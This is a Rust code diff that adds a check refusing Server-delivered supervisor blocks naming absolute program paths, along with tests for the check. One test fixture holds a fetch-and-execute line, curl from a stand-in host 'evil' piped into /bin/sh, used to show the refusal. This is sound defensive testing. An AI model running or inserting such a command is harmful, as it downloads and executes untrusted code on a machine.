@@ -78,7 +78,7 @@ async fn apply_inner(
     let mut candidate = config.clone();
     candidate.supervisors = blocks.clone();
     for block in &blocks {
-        crate::supervisor::validate_block(&candidate, block).map_err(Refused)?;
+        validate_offered_block(&candidate, block).map_err(Refused)?;
     }
 
     // The apply is a diff, keyed by Supervisor name: removed and changed stop, changed and added
@@ -246,6 +246,31 @@ fn offered_blocks(
     Ok((blocks, tables))
 }
 
+/// Validates one offered `[[supervisor]]` block before any running process is touched: the startup
+/// loader's own checks (block schema, program-path resolution, ports, timeouts — ADR-0056 point 2),
+/// and then the delivery-path constraint of ADR-0057.
+///
+/// A Server-delivered block may name only a program **this Client owns** — a bare file name, whose
+/// program lives in a directory this Client created and updates from signature-verified packages
+/// (ADR-0021). An absolute path is the machine's own process; letting the Server spawn one would be
+/// arbitrary code execution that never passes through package signing. This binds the delivery path
+/// alone: an operator may still write an absolute-path Supervisor in `client.toml` by hand, a
+/// different principal that `resolve_program` must keep serving — which is why the rule lives here
+/// and not in path resolution.
+fn validate_offered_block(config: &ClientConfig, block: &SupervisorBlock) -> Result<(), String> {
+    crate::supervisor::validate_block(config, block)?;
+    let program = crate::supervisor::resolve_block_program(config, block)?;
+    if !program.owned {
+        return Err(format!(
+            "supervisor {:?}: a Server-delivered supervisor may run only a program this Client \
+             owns — name it with a bare file name, not the absolute path {}",
+            block.name,
+            program.path.display()
+        ));
+    }
+    Ok(())
+}
+
 /// The `[[supervisor]]` blocks of one parsed entry, whichever TOML spelling carried them —
 /// an array of tables, or an inline array of inline tables. `None` when the key is neither.
 fn supervisor_tables(item: &toml_edit::Item) -> Option<Vec<toml_edit::Table>> {
@@ -367,6 +392,60 @@ mod tests {
         let err = offered_blocks(&offer).expect_err("a block without a name");
         assert!(err.contains("\"bad\""), "{err}");
         assert!(err.contains("needs a `name`"), "{err}");
+    }
+
+    /// ADR-0057: a Server-delivered block that names an **absolute** program path is refused as a
+    /// whole — that is the machine's own process, and letting the Server spawn one would run
+    /// arbitrary code that never passed through package signing. The refusal names the block and the
+    /// path, and (being a validation failure) leaves the running set and the file untouched.
+    #[test]
+    fn a_server_delivered_block_may_not_name_an_absolute_program() {
+        let offer = offer_of(&[(
+            "fleet",
+            "[[supervisor]]\ntype = \"command\"\nname = \"shell\"\n\
+             command = \"/bin/sh\"\nargs = [\"-c\", \"curl http://evil | sh\"]\n",
+        )]);
+        let (blocks, _) = offered_blocks(&offer).expect("parse");
+        let mut config: ClientConfig = toml::from_str("").expect("config");
+        config.supervisors = blocks.clone();
+
+        let err = validate_offered_block(&config, &blocks[0]).expect_err("absolute path refused");
+        assert!(err.contains("\"shell\""), "names the block: {err}");
+        assert!(err.contains("only a program this Client owns"), "{err}");
+        assert!(err.contains("/bin/sh"), "names the path: {err}");
+    }
+
+    /// The counterpart: a bare file name is a program this Client owns (ADR-0021), so a delivered
+    /// block that names one is accepted — the ordinary, intended delivery shape.
+    #[test]
+    fn a_server_delivered_block_naming_a_bare_program_is_accepted() {
+        let offer = offer_of(&[(
+            "fleet",
+            "[[supervisor]]\ntype = \"command\"\nname = \"agent\"\ncommand = \"agent\"\n",
+        )]);
+        let (blocks, _) = offered_blocks(&offer).expect("parse");
+        let mut config: ClientConfig = toml::from_str("").expect("config");
+        config.supervisors = blocks.clone();
+
+        validate_offered_block(&config, &blocks[0]).expect("a bare-name program is owned");
+    }
+
+    /// The constraint reaches every plugin's program key: a `collector` block whose `binary` is an
+    /// absolute path is the machine's Collector, refused on the delivery path just like `command`.
+    #[test]
+    fn a_delivered_collector_binary_must_be_owned_too() {
+        let offer = offer_of(&[(
+            "fleet",
+            "[[supervisor]]\ntype = \"collector\"\nname = \"otelcol\"\n\
+             binary = \"/usr/local/bin/otelcol\"\n",
+        )]);
+        let (blocks, _) = offered_blocks(&offer).expect("parse");
+        let mut config: ClientConfig = toml::from_str("").expect("config");
+        config.supervisors = blocks.clone();
+
+        let err = validate_offered_block(&config, &blocks[0]).expect_err("absolute binary refused");
+        assert!(err.contains("only a program this Client owns"), "{err}");
+        assert!(err.contains("/usr/local/bin/otelcol"), "{err}");
     }
 
     /// The composed map may spread blocks over several entries (one per matching Configuration);
